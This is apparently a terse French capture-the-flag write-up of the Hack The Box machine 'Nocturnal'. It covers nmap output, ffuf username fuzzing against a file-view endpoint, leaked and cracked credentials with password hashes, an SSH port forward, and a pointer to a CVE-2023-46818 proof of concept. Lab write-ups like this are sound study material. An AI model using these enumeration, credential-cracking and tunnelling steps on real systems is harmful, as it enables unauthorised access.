Difficulte : Easy 
# Enumeration 
## Nmap 
Nous commençons par exécuter une analyse Nmap sur la cible . 

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
|_  256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://nocturnal.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


Nmap révèle une installation avec le domaine nocturnal.htb. 
Nous ajoutons le domaine découvert à notre fichier hosts.

```
echo "10.10.11.64 nocturnal.htb" | sudo tee -a /etc/hosts
```

![[Pasted image 20250527003400.png]]

```
ffuf -u 'http://nocturnal.htb/view.php?username=FUZZ&file=*.pdf' -w
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -mc 200 -fr
"User not found." -H "Cookie: PHPSESSID=4d9uqe8ifkefg1pkgu5ksi06qs"
```


http://nocturnal.htb/view.php?username=amanda&file=file.pdf

![[Pasted image 20250527004606.png]]

arHkG7HAI68X8s1J.


admin:d725aeba143f575736b07e045d8ceebb
tobias:55c82b1ccd55ab219b3b109b07d5061d


tobias:slowmotionapocalypse

netstat -tulpn 2>/dev/null

ssh -L 8080:127.0.0.1:8080 tobias@10.10.11.64


![[Pasted image 20250527005832.png]]

CVE-2023-46818 poc